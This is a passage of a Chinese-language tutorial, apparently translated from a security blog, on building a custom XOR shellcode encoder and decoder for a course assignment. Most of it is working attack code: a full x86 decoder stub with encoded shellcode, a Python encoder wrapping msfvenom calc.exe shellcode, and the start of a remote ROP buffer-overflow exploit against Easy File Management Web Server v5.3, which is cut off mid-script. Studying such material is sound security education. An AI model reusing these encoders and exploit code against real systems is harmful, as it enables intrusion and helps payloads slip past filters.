mov&nbsp;[edi],&nbsp;al&nbsp;;save&nbsp;(decode)&nbsp;to&nbsp;the&nbsp;same&nbsp;memory&nbsp;location&nbsp;as&nbsp;the&nbsp;encoded&nbsp;shellcode</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">当这个内存写入操作完成之后，相应的计数器以及指针的值会得到更新，为下一个数据块的异或处理做好准备。</span></p><pre class="brush:plain;toolbar:false">inc&nbsp;edi&nbsp;;move&nbsp;decoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
inc&nbsp;esi&nbsp;;move&nbsp;encoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;inc&nbsp;ecx&nbsp;;
increment&nbsp;inner&nbsp;loop-counter</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">由于编码器将shellcode按3字节大小进行切割，并在开头部位添加一个随机的字节，最终生成4字节大小的数据块，因此解码器需要做相同的操作：将经过编码的shellcode按4字节进行切割。我们可以在ECX寄存器上使用CMP-JNE循环，通过一组异或指令完成这个任务：</span></p><pre class="brush:plain;toolbar:false">l0:
&nbsp;mov&nbsp;al,&nbsp;[esi]&nbsp;;get&nbsp;first&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;mov&nbsp;bl,&nbsp;[esi+1]&nbsp;;get&nbsp;second&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;xor&nbsp;al,&nbsp;bl&nbsp;;xor&nbsp;them&nbsp;(result&nbsp;is&nbsp;saved&nbsp;to&nbsp;eax)&nbsp;
&nbsp;mov&nbsp;[edi],&nbsp;al&nbsp;;save&nbsp;(decode)&nbsp;to&nbsp;the&nbsp;same&nbsp;memory&nbsp;location&nbsp;as&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;inc&nbsp;edi&nbsp;;move&nbsp;decoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
&nbsp;inc&nbsp;esi&nbsp;;move&nbsp;encoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
&nbsp;inc&nbsp;ecx&nbsp;;increment&nbsp;inner&nbsp;loop-counter&nbsp;
&nbsp;cmp&nbsp;cl,&nbsp;0x3&nbsp;;dealing&nbsp;with&nbsp;4byte-blocks!&nbsp;
&nbsp;jne&nbsp;l0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上述代码中，如果CL等于3（表明已经执行了3条异或操作），解码器可以再次增加ESI的值，然后接收下一个4字节大小的数据块。这意味着解码器“跳过”了上一个数据块的最后一个字节，因为解码器需要再次从随机的字节开始处理。我们还需要将EDX外部循环计数器加上0x4，以确保解码器能在合适的位置访问编码后的shellcode的尾部地址，而不会导致SISEGV错误：</span></p><pre class="brush:plain;toolbar:false">inc&nbsp;esi&nbsp;;move&nbsp;encoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
xor&nbsp;ecx,&nbsp;ecx&nbsp;;clear&nbsp;inner&nbsp;loop-counter&nbsp;
add&nbsp;dx,&nbsp;0x4&nbsp;;move&nbsp;outer&nbsp;loop-counter&nbsp;4&nbsp;bytes&nbsp;onward&nbsp;
cmp&nbsp;dx,&nbsp;len&nbsp;;check&nbsp;whether&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;shellcode&nbsp;is&nbsp;reached&nbsp;
jne&nbsp;l0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这两个循环都是用来遍历处理编码后的shellcode的4字节数据块，在同一个内存位置实时生成解码后的shellcode。大家是否还记得第一条PUSH指令？这条指令用来完成解码器的最后操作，调用解码后的shellcode：</span></p><pre class="brush:plain;toolbar:false">call&nbsp;[esp]&nbsp;;execute&nbsp;decoded&nbsp;shellcode</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因此，完整版的汇编语言开发的解码器如下所示：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">;&nbsp;SLAE&nbsp;-&nbsp;Assignment&nbsp;#4:&nbsp;Custom&nbsp;Shellcode&nbsp;Encoder/Decoder&nbsp;(Linux/x86)&nbsp;
;&nbsp;Author:&nbsp;Julien&nbsp;Ahrens&nbsp;(@MrTuxracer)&nbsp;
;&nbsp;Website:&nbsp;http://www.rcesecurity.com

global&nbsp;_start
section&nbsp;.text&nbsp;
_start:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;getshellcode
decoder:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;esi&nbsp;;pointer&nbsp;to&nbsp;shellcode&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;esi&nbsp;;save&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;for&nbsp;later&nbsp;execution&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edi,&nbsp;esi&nbsp;;copy&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;edi&nbsp;to&nbsp;work&nbsp;with&nbsp;it
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;;clear&nbsp;first&nbsp;XOR-operand&nbsp;register
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;ebx,&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;;clear&nbsp;second&nbsp;XOR-operand&nbsp;register
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;ecx,&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;;clear&nbsp;inner&nbsp;loop-counter
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;edx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;;clear&nbsp;outer&nbsp;loop-counter
loop0:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;al,&nbsp;[esi]&nbsp;;get&nbsp;first&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;bl,&nbsp;[esi+1]&nbsp;;get&nbsp;second&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;al,&nbsp;bl&nbsp;;xor&nbsp;them&nbsp;(result&nbsp;is&nbsp;saved&nbsp;to&nbsp;eax)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[edi],&nbsp;al&nbsp;;save&nbsp;(decode)&nbsp;to&nbsp;the&nbsp;same&nbsp;memory&nbsp;location&nbsp;as&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;edi&nbsp;;move&nbsp;decoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;esi&nbsp;;move&nbsp;encoded-pointer&nbsp;1&nbsp;byte&nbsp;onward&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;ecx&nbsp;;increment&nbsp;inner&nbsp;loop-counter&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;cl,&nbsp;0x3&nbsp;;dealing&nbsp;with&nbsp;4byte-blocks!&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;loop0
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;move&nbsp;encoded-pointer&nbsp;1&nbsp;byte&nbsp;onward
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;ecx,&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;;clear&nbsp;inner&nbsp;loop-counter
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;dx,&nbsp;0x4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;move&nbsp;outer&nbsp;loop-counter&nbsp;4&nbsp;bytes&nbsp;onward
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;dx,&nbsp;len&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;check&nbsp;whether&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;shellcode&nbsp;is&nbsp;reached
&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;loop0
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;[esp]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;execute&nbsp;decoded&nbsp;shellcode
&nbsp;&nbsp;&nbsp;&nbsp;
get_shellcode:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;decoder&nbsp;shellcode:&nbsp;db&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;0x60,0x0a,0x6c,0x34,0xa6,0xcc,0xcd,0x96,0xf9,0xc8,0x3e,0x68,0xa6,0xf5,0x9f,0x9d,0x37,0xbe,0x5f,0x92,0x5d,0xdd,0x82,0x15,0xe4,0x77,0xc7,0xa1,0xdc,0x8a,0xec,0x84,0xe2,0xe7,0xde,0xb8,0x17,0x44,0xcd,0x2c,0x1d,0x77,0x67,0x36,0x18,0x4f,0xc6,0x27,0x55,0x98,0x18,0xa8,0x52,0x34,0x87,0x83,0xdc,0x8a,0xdd,0x54,0xa5,0x44,0x89,0x09,0xa6,0x16,0x70,0x33,0xe6,0xb0,0xe6,0xb1,0xbf,0x36,0xd7,0x1a,0x5b,0xdb,0x82,0xdb,0xea,0x5b,0x59,0xca,0x23,0x93,0xac,0x61,0x0d,0x8d,0xc4,0xbd,0xed,0x14,0xa4,0xaf,0xe0,0x88,0xa7,0x88,0x25,0x56,0x3e,0x56,0x63,0x4c,0x2e,0x47,0x5c,0x32,0xbb,0x58,0xc3,0x82,0x0b,0xc1,0xff,0x32,0xb2,0x22&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;len:&nbsp;equ&nbsp;$-shellcode</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">接下来我们可以给出一些演示案例。</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">五、在Linux上执行Shellcode</span></strong></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">大家可以从我的Github仓库上下载脚本，完成obj导出以及编译过程：</span></p><p style="text-align: center;"><img src="http://p6.qhimg.com/t01f1b42178a0ae8c4b.png" title="t01211fce2397a4210c.png" alt="http://p3.qhimg.com/t01211fce2397a4210c.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以使用GDB来确认解码器是否正常工作。在解码过程的初始阶段，ESI指向的是编码后的shellcode：</span></p><p style="text-align: center;"><img src="http://p1.qhimg.com/t01a2dee67c0efe64ac.png" title="t014bc95614efde45c0.png" alt="http://p2.qhimg.com/t014bc95614efde45c0.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在shellcode的尾部，我们可以发现调用shellcode的实际上是“call [esp]”指令，这段shellcode的解码过程准确无误：</span></p><p style="text-align: center;"><img src="http://p0.qhimg.com/t010da7ac6ca777d1a2.png" title="t012cc697a5e0aa7444.png" alt="http://p3.qhimg.com/t012cc697a5e0aa7444.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因此，最后shellcode的执行过程也非常成功：</span></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t016f4ccb343fd4945b.png" title="t013b9d3bbb7aedda34.png" alt="http://p2.qhimg.com/t013b9d3bbb7aedda34.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们的成果已经得到证实。此时此刻，你可能已经注意到编码过程会将编码后的shellcode的大小增大将近一倍，当shellcode可存放的空间大小捉襟见肘时，你可能需要重点关注这个情况。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">六、在现实世界中实现Shellcode的跨平台执行</span></strong></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">上述演示过程非常顺利，因为整个过程完全运行在一个可控的环境中。现在，我们可以在现实的攻击场景中使用这个解码器。你可能对我之前做过的工作有所了解（可以参考<a href="http://www.rcesecurity.com/2014/05/easy-file-management-web-server-v5-3-exploit-kung-fu/" target="_self">Easy File Management Webserver</a>的攻击过程），当时我使用了一个自定义的ROP利用工具来弹出一个calc.exe窗口。现在我们可以修改这个工具，以演示我们自定义的编码器以及解码器。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们需要一段“纯净版”的shellcode代码。非常幸运的是，msfvenom可以满足我们的需求：</span></p><pre class="brush:bash;toolbar:false">msfvenom&nbsp;-p&nbsp;windows/exec&nbsp;CMD=calc.exe&nbsp;-f&nbsp;python&nbsp;-e&nbsp;generic/none</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">从输出中我们可以看到文本形式的shellcode：</span></p><p style="text-align: center;"><img src="http://p6.qhimg.com/t01f206063d11716b9b.png" title="t019e301ac18bce8b93.png" alt="http://p1.qhimg.com/t019e301ac18bce8b93.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你在攻击工具中直接使用这段shellcode，那么它会导致整个攻击行动失败，因为这段代码中有大量不可用的字符（如0x00）。首先我们可以对这段shellcode进行编码，但我们需要确保所有不可用字符都经过处理，对于这段代码而言，这些字符为：0x00, 0x0a, 0x0b and 0x3b。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">#!/usr/bin/python
#SLAE&nbsp;-&nbsp;Assignment&nbsp;#4:&nbsp;Custom&nbsp;Shellcode&nbsp;Encoder/Decoder
#Author:&nbsp;Julien&nbsp;Ahrens&nbsp;(@MrTuxracer)
#Website:&nbsp;http://www.rcesecurity.com
from&nbsp;random&nbsp;import&nbsp;randint
#powered&nbsp;by&nbsp;Metasploit
#windows/exec&nbsp;CMD=calc.exe
#msfvenom&nbsp;-p&nbsp;windows/exec&nbsp;CMD=calc.exe&nbsp;-f&nbsp;python&nbsp;-e&nbsp;generic/none
#Encoder:&nbsp;Custom
shellcode&nbsp;=&nbsp;&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;&nbsp;
shellcode&nbsp;+=&nbsp;&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;

badchars&nbsp;=&nbsp;[&quot;\x00&quot;,&quot;\x0a&quot;,&quot;\x0d&quot;,&quot;\x3b&quot;]

def&nbsp;xorBytes(byteArray):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Randomize&nbsp;first&nbsp;byte&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;rnd=randint(1,255)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor1=(rnd&nbsp;^&nbsp;byteArray[0])&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor2=(xor1&nbsp;^&nbsp;byteArray[1])&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor3=(xor2&nbsp;^&nbsp;byteArray[2])
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xorArray=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(rnd)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor1)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor2)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor3)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;cleanBadChars(byteArray,&nbsp;xorArray,&nbsp;badchars)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;cleanBadChars(origArray,&nbsp;payload,&nbsp;badchars):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k&nbsp;in&nbsp;badchars:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Ooops,&nbsp;BadChar&nbsp;found&nbsp;:(&nbsp;Do&nbsp;XOR&nbsp;stuff&nbsp;again&nbsp;with&nbsp;a&nbsp;new&nbsp;random&nbsp;value&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;could&nbsp;run&nbsp;into&nbsp;an&nbsp;infinite&nbsp;loop&nbsp;in&nbsp;some&nbsp;cases&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;payload.find(k)&nbsp;&gt;=&nbsp;0:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload=xorBytes(origArray)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;encodeShellcode&nbsp;(byteArr):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;shellcode=bytearray()&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;shellcode.extend(byteArr)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;encoded=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;tmp=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;final=&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Check&nbsp;whether&nbsp;shellcode&nbsp;is&nbsp;aligned
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(shellcode)&nbsp;%&nbsp;3&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)
&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;len(shellcode)&nbsp;%&nbsp;3&nbsp;==&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Loop&nbsp;to&nbsp;split&nbsp;shellcode&nbsp;into&nbsp;3-byte-blocks
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0,len(shellcode),3):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i+1])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i+2])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Do&nbsp;the&nbsp;RND-Insertion&nbsp;and&nbsp;chained&nbsp;XORs
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp=xorBytes(tmp_block)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Some&nbsp;formatting&nbsp;things&nbsp;for&nbsp;easier&nbsp;use&nbsp;in&nbsp;NASM&nbsp;:)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;y&nbsp;in&nbsp;tmp:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(str(hex(y)))&nbsp;==&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final+=str(hex(y)[:2])&nbsp;+&nbsp;&quot;0&quot;&nbsp;+&nbsp;str(hex(y)[2:])+&quot;,&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final+=hex(y)+&quot;,&quot;

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;final[:-1]
print&nbsp;&quot;Encoded&nbsp;Shellcode:\r&quot;&nbsp;
print&nbsp;encodeShellcode(shellcode)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">从我的脚本的输出结果中，我们完全找不到这些不可用字符的踪影：</span><br/></p><p style="text-align: center;"><img src="http://p3.qhimg.com/t0160b1de76733757ee.png" title="t01b8c780850847eb91.png" alt="http://p4.qhimg.com/t01b8c780850847eb91.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加解码器之后，这段代码的大小稍微增加了一些：</span></p><p style="text-align: center;"><img src="http://p0.qhimg.com/t012617d3f49ec77699.png" title="t019561c89759b91a32.png" alt="http://p1.qhimg.com/t019561c89759b91a32.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，这段shellcode已经可以在我的<a href="http://www.exploit-db.com/exploits/33610/" target="_self">攻击程序</a>中使用了：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">#!/usr/bin/python
#Exploit&nbsp;Title:&nbsp;Easy&nbsp;File&nbsp;Management&nbsp;Web&nbsp;Server&nbsp;v5.3&nbsp;-&nbsp;USERID&nbsp;Remote&nbsp;Buffer&nbsp;Overflow&nbsp;(ROP)
#Version:&nbsp;5.3
#Date:&nbsp;2014-05-31
#Author:&nbsp;Julien&nbsp;Ahrens&nbsp;(@MrTuxracer)
#Homepage:&nbsp;http://www.rcesecurity.com
#Software&nbsp;Link:&nbsp;http://www.efssoft.com/
#Tested&nbsp;on:&nbsp;WinXP-GER,&nbsp;Win7x64-GER,&nbsp;Win8-EN,&nbsp;Win8x64-GER
#Credits&nbsp;for&nbsp;vulnerability&nbsp;discovery:
#superkojiman&nbsp;(http://www.exploit-db.com/exploits/33453/)
#Howto&nbsp;/&nbsp;Notes:
#This&nbsp;scripts&nbsp;exploits&nbsp;the&nbsp;buffer&nbsp;overflow&nbsp;vulnerability&nbsp;caused&nbsp;by&nbsp;an&nbsp;oversized&nbsp;UserID&nbsp;-&nbsp;string&nbsp;as
#discovered&nbsp;by&nbsp;superkojiman.&nbsp;In&nbsp;comparison&nbsp;to&nbsp;superkojiman&#39;s&nbsp;exploit,&nbsp;this&nbsp;exploit&nbsp;does&nbsp;not
#brute&nbsp;force&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;overwritten&nbsp;stackpart,&nbsp;instead&nbsp;it&nbsp;uses&nbsp;code&nbsp;from&nbsp;its&nbsp;own
#.text&nbsp;segment&nbsp;to&nbsp;achieve&nbsp;reliable&nbsp;code&nbsp;execution.

from&nbsp;struct&nbsp;import&nbsp;pack&nbsp;
import&nbsp;socket,sys&nbsp;
import&nbsp;os
host=&quot;192.168.0.1&quot;&nbsp;
port=80
junk0&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;80
#Instead&nbsp;of&nbsp;bruteforcing&nbsp;the&nbsp;stack&nbsp;address,&nbsp;let&#39;s&nbsp;take&nbsp;an&nbsp;address&nbsp;
#from&nbsp;the&nbsp;.text&nbsp;segment,&nbsp;which&nbsp;is&nbsp;near&nbsp;to&nbsp;the&nbsp;stackpivot&nbsp;instruction:
#0x1001d89b&nbsp;:&nbsp;{pivot&nbsp;604&nbsp;/&nbsp;0x25c}&nbsp;#&nbsp;POP&nbsp;EDI&nbsp;#&nbsp;POP&nbsp;ESI&nbsp;#&nbsp;POP&nbsp;EBP&nbsp;#&nbsp;POP&nbsp;EBX&nbsp;#&nbsp;ADD&nbsp;ESP,24C&nbsp;#&nbsp;RETN&nbsp;[ImageLoad.dll]
#The&nbsp;memory&nbsp;located&nbsp;at&nbsp;0x1001D8F0:&nbsp;&quot;\x7A\xD8\x01\x10&quot;&nbsp;does&nbsp;the&nbsp;job!
#Due&nbsp;to&nbsp;call&nbsp;dword&nbsp;ptr&nbsp;[edx+28h]:&nbsp;0x1001D8F0&nbsp;-&nbsp;28h&nbsp;=&nbsp;0x1001D8C8
call_edx=pack(&#39;&lt;L&#39;,0x1001D8C8)

junk1=&quot;\x90&quot;&nbsp;*&nbsp;280&nbsp;
ppr=pack(&#39;&lt;L&#39;,0x10010101)&nbsp;#&nbsp;POP&nbsp;EBX&nbsp;#&nbsp;POP&nbsp;ECX&nbsp;#&nbsp;RETN&nbsp;[ImageLoad.dll]
#Since&nbsp;0x00&nbsp;would&nbsp;break&nbsp;the&nbsp;exploit,&nbsp;the&nbsp;0x00457452&nbsp;(JMP&nbsp;ESP&nbsp;[fmws.exe])&nbsp;needs&nbsp;to&nbsp;be&nbsp;crafted&nbsp;on&nbsp;the&nbsp;stack
craftedjmpesp=pack(&#39;&lt;L&#39;,0xA445ABCF)
test_bl=pack(&#39;&lt;L&#39;,0x10010125)&nbsp;#&nbsp;contains&nbsp;00000000&nbsp;to&nbsp;pass&nbsp;the&nbsp;JNZ&nbsp;instruction
kungfu=pack(&#39;&lt;L&#39;,0x10022aac)&nbsp;#&nbsp;MOV&nbsp;EAX,EBX&nbsp;#&nbsp;POP&nbsp;ESI&nbsp;#&nbsp;POP&nbsp;EBX&nbsp;#&nbsp;RETN&nbsp;[ImageLoad.dll]&nbsp;kungfu+=pack(&#39;&lt;L&#39;,0xDEADBEEF)&nbsp;#&nbsp;filler&nbsp;
kungfu+=pack(&#39;&lt;L&#39;,0xDEADBEEF)&nbsp;#&nbsp;filler&nbsp;
